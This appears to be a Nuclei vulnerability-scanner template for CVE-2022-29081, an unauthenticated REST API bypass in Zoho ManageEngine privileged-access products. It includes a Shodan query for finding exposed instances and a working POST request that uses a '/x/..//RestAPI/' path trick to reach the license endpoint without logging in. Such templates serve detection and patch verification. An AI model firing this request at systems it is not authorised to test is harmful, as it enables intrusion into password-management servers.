id: CVE-2022-29081
info:
  name: Zoho ManageEngine - Access Control Bypass
  author: 0xanis
  severity: critical
  description: |
    Zoho ManageEngine Access Manager Plus before 4302, Password Manager Pro before 12007,
    and PAM360 before 5401 are vulnerable to an authentication bypass vulnerability
    in the REST API due to an improper URI check. An unauthenticated remote attacker
    can exploit this by crafting a URL with a pattern like /x/../RestAPI/ to bypass
    security checks on specific REST API URLs.
  reference:
    - https://www.tenable.com/security/research/tra-2022-14
    - https://www.manageengine.com/privileged-session-management/advisory/cve-2022-29081.html
    - https://nvd.nist.gov/vuln/detail/CVE-2022-29081
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-29081
    cwe-id: CWE-22
  tags: cve,cve2022,zoho,manageengine,auth-bypass,kev
  metadata:
    shodan-query: 'http.title:"manageengine"'

http:
  - method: POST
    path:
      - "{{BaseURL}}/x/..//RestAPI/LicenseMgr"
    body: "operation=getLicenseDetails"
    headers:
      Content-Type: application/x-www-form-urlencoded

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"BUILD_NO"'
          - '"LICENSE_TO"'
          - '"VERSION"'
          - '"PRODUCT_NAME"'
        condition: and

      - type: status
        status:
          - 200
